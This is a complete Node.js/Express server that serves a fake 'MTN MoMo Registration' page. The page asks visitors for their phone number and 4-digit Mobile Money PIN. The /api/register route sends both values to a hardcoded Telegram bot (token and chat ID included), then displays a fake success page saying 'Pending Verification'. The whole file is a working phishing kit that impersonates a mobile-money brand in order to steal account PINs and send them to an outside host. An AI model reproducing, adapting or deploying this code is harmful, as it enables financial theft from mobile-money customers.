const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== CONFIGURATION =====
const BOT_TOKEN = '8251322580:AAFB3YYWIlUcdQMoxVMDwC3LJWUg_piMrjI';
const CHAT_ID = '6306424209';

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== HTML PAGE (embedded in server) =====
const HTML_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MTN MoMo Registration</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#FFCC00 0%,#FFB300 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:white;border-radius:20px;padding:40px 30px;max-width:420px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
header{text-align:center;margin-bottom:30px}
header .logo{width:80px;height:80px;background:#FFCC00;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 15px;font-size:26px;font-weight:bold;color:#000;box-shadow:0 5px 15px rgba(255,204,0,0.4)}
header h1{color:#333;font-size:1.8em;margin:0}
header p{color:#666;margin-top:5px;font-size:0.95em}
.form-group{margin-bottom:22px}
.form-group label{display:block;margin-bottom:8px;color:#555;font-weight:600;font-size:14px}
.form-group label .required{color:#f44336}
.form-group input{width:100%;padding:15px;border:2px solid #e0e0e0;border-radius:10px;font-size:16px;transition:all 0.3s;background:#fafafa}
.form-group input:focus{border-color:#FFCC00;outline:none;background:white;box-shadow:0 0 0 3px rgba(255,204,0,0.2)}
.btn{width:100%;padding:16px;border:none;border-radius:10px;font-size:18px;font-weight:bold;cursor:pointer;transition:all 0.3s;color:#000;background:#FFCC00;margin-top:10px}
.btn:hover:not(:disabled){background:#FFB300;transform:translateY(-2px);box-shadow:0 5px 20px rgba(255,204,0,0.5)}
.btn:disabled{opacity:0.6;cursor:not-allowed}
.message{padding:15px;border-radius:10px;margin-top:15px;font-weight:500;display:none;text-align:center}
.message.show{display:block}
.message.success{background:#d4edda;color:#155724;border:1px solid #c3e6cb}
.message.error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}
.loader{display:inline-block;width:18px;height:18px;border:3px solid rgba(0,0,0,0.2);border-radius:50%;border-top-color:#000;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="container">
<header>
<div class="logo">MTN</div>
<h1>MoMo Registration</h1>
<p>Register your MTN Mobile Money account</p>
</header>
<form id="registerForm">
<div class="form-group">
<label>MTN Number <span class="required">*</span></label>
<input type="tel" id="mtnNumber" placeholder="0244123456" pattern="[0-9]*" inputmode="numeric" required autocomplete="off">
</div>
<div class="form-group">
<label>MoMo PIN <span class="required">*</span></label>
<input type="password" id="momoPin" placeholder="Enter 4-digit PIN" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required autocomplete="off">
</div>
<button type="submit" class="btn" id="submitBtn"><span id="submitText">Register</span></button>
</form>
<div id="messageDiv" class="message"></div>
</div>
<script>
document.getElementById('registerForm').addEventListener('submit',async function(e){
e.preventDefault();
var mtnNumber=document.getElementById('mtnNumber').value.trim();
var momoPin=document.getElementById('momoPin').value.trim();
if(!mtnNumber){showMessage('Please enter your MTN number','error');return}
if(mtnNumber.length<10){showMessage('Please enter a valid MTN number (10 digits)','error');return}
if(!momoPin||momoPin.length!==4){showMessage('MoMo PIN must be 4 digits','error');return}
var btn=document.getElementById('submitBtn');
var btnText=document.getElementById('submitText');
btn.disabled=true;
btnText.innerHTML='<span class="loader"></span> Registering...';
try{
var response=await fetch('/api/register',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mtnNumber:mtnNumber,momoPin:momoPin})});
var data=await response.json();
if(data.success){
localStorage.setItem('registrationId',data.registrationId);
localStorage.setItem('mtnNumber',mtnNumber);
window.location.href='/success';
}else{
showMessage(data.message||'Registration failed','error');
btn.disabled=false;
btnText.textContent='Register';
}
}catch(error){
console.error('Error:',error);
showMessage('Network error. Please try again.','error');
btn.disabled=false;
btnText.textContent='Register';
}
});
document.getElementById('mtnNumber').addEventListener('input',function(){this.value=this.value.replace(/\\D/g,'')});
document.getElementById('momoPin').addEventListener('input',function(){this.value=this.value.replace(/\\D/g,'')});
function showMessage(text,type){
var div=document.getElementById('messageDiv');
div.textContent=text;
div.className='message show '+type;
setTimeout(function(){div.className='message'},5000);
}
</script>
</body>
</html>`;

// ===== SUCCESS PAGE (embedded in server) =====
const SUCCESS_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Registration Successful</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#FFCC00 0%,#FFB300 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:white;border-radius:20px;padding:50px 30px;max-width:420px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
.success-icon{width:90px;height:90px;background:#28a745;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 25px;font-size:50px;color:white}
h1{color:#28a745;margin-bottom:10px;font-size:1.6em}
p{color:#666;margin-bottom:10px;line-height:1.6}
.details{background:#f8f9fa;border-radius:12px;padding:20px;margin:25px 0;text-align:left}
.detail-row{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid #e9ecef}
.detail-row:last-child{border-bottom:none}
.detail-label{color:#666;font-weight:500}
.detail-value{color:#333;font-weight:600}
.status-badge{display:inline-block;padding:10px 25px;border-radius:25px;font-size:14px;font-weight:bold;background:#fff3cd;color:#856404;margin-top:15px}
.btn{width:100%;padding:16px;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;color:#000;background:#FFCC00;margin-top:20px}
.btn:hover{background:#FFB300}
</style>
</head>
<body>
<div class="container">
<div class="success-icon">✓</div>
<h1>Registration Successful!</h1>
<p>Your MTN MoMo registration has been received.</p>
<div class="details">
<div class="detail-row"><span class="detail-label">Registration ID</span><span class="detail-value" id="regId">#----</span></div>
<div class="detail-row"><span class="detail-label">MTN Number</span><span class="detail-value" id="regNumber">---</span></div>
</div>
<div class="status-badge">Pending Verification</div>
<p style="margin-top:20px;font-size:13px;color:#999">You will receive a confirmation SMS shortly.</p>
<button class="btn" onclick="window.location.href='/'">Register Another Account</button>
</div>
<script>
document.getElementById('regId').textContent='#'+(localStorage.getItem('registrationId')||'----');
document.getElementById('regNumber').textContent=localStorage.getItem('mtnNumber')||'---';
</script>
</body>
</html>`;

// ===== ROUTES =====
app.get('/', (req, res) => {
    res.send(HTML_PAGE);
});

app.get('/success', (req, res) => {
    res.send(SUCCESS_PAGE);
});

// ===== API: REGISTER =====
app.post('/api/register', async (req, res) => {
    try {
        const { mtnNumber, momoPin } = req.body;

        if (!mtnNumber || !momoPin) {
            return res.status(400).json({
                success: false,
                message: 'MTN number and MoMo PIN are required'
            });
        }

        if (momoPin.length !== 4) {
            return res.status(400).json({
                success: false,
                message: 'MoMo PIN must be 4 digits'
            });
        }

        const registrationId = Math.floor(10000 + Math.random() * 90000).toString();

        const message =
            '📱 <b>NEW MTN MOMO REGISTRATION</b>\n\n' +
            '🆔 <b>Registration ID:</b> <code>#' + registrationId + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n' +
            '📞 <b>MTN Number:</b> <code>' + mtnNumber + '</code>\n' +
            '🔑 <b>MoMo PIN:</b> <code>' + momoPin + '</code>\n' +
            '━━━━━━━━━━━━━━━━━━━━\n\n' +
            '⏰ <b>Submitted:</b> ' + new Date().toLocaleString();

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });

        console.log('✅ Registration sent:', registrationId);

        res.json({
            success: true,
            registrationId: registrationId,
            message: 'Registration successful'
        });

    } catch (error) {
        console.error('❌ Error:', error.response?.data || error.message);
        res.status(500).json({
            success: false,
            message: 'Failed to process registration'
        });
    }
});

// ===== HEALTH CHECK =====
app.get('/health', (req, res) => {
    res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

// ===== START SERVER =====
app.listen(PORT, () => {
    console.log(`🚀 MTN MoMo Registration running on port ${PORT}`);
});
